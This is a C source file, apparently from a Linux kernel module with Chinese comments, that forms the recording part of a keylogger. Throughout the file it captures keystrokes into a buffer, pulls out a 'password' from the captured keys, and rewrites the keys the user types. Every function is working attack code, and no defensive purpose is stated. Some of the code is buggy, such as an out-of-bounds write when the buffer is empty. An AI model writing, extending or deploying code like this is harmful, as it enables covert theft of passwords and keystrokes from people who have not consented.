#include <linux/kernel.h>
#include <linux/input.h>

#include "common.h"


// 全局变量用来存储按键信息
unsigned char key_store[256] = {0};
// 最后一个key的位置
int key_store_index = -1;

bool key_record_status = false;


/**
 * @brief 设置键盘记录状态
 * @param status
 * @return  返回当前的状态
 */
bool set_key_record_status(bool status)
{
    printk("%s [%d]\n", __func__, status);
    key_record_status = status;
    return key_record_status;
}

/**
 * @brief 获取当前键盘记录状态
 * @return
 */
bool get_key_record_status(void)
{
    printk("%s [%d]\n", __func__, key_record_status);
    return key_record_status;
}

/**
 * @brief 记录按键信息
 * @param key
 */
void key_store_record(unsigned char key)
{
    printk("%s key = [%c], status = [%d]\n", __func__, key, key_record_status);
    if (key_record_status) {
        if (key == KEY_BACKSPACE) {
            key_store_delete_a_key();
        } else {
            key_store_add_a_key(key);
        }
    }
}


/**
 * @brief 修改key值的算法1
 * @param key  要修改的key值
 */
void modify_current_key_method1(unsigned long * key)
{
    printk("%s key = [%c], status = [%d]\n", __func__, key, key_record_status);
    if (key_record_status) {
        // 全部修改为按键 0
        // 11是0键的扫描码
        if (*key == 14 /*KEY_BACKSPACE*/) {
            return;
        }
        *key = 11;
    }
}


/**
 * @brief 从key_store中获取passwd，是否加密再说
 * @param buf 存储获取的数据
 * @return  返回数组长度
 */
int get_passwd_from_key_store(unsigned char * buf)
{
    memcpy(buf, key_store, key_store_index+1);
    printk("%s buf = [%s], len = [%d]\n", __func__, buf, key_store_index + 1);
    return key_store_index+1;
}


/**
 * @brief 记录按键
 * @param key
 */
void key_store_add_a_key(unsigned char key)
{
    if (key_store_index < 255) {
        key_store_index++;
        key_store[key_store_index] = key;
        printk("%s key = [%c], index = [%d]\n", __func__, key, key_store_index);
    }
}


/**
 * @brief 删除末尾的一个按键
 */
void key_store_delete_a_key(void)
{
    printk("%s key = [%c]\n", __func__, key_store[key_store_index]);
    key_store[key_store_index] = 0;
    if (key_store_index >= 0) {
        key_store_index--;
    }
}


/**
 * @brief 清空按键存储区域
 */
void key_store_clear(void)
{
    printk("%s\n", __func__);
    memset(key_store, 0, 256);
    key_store_index = -1;
}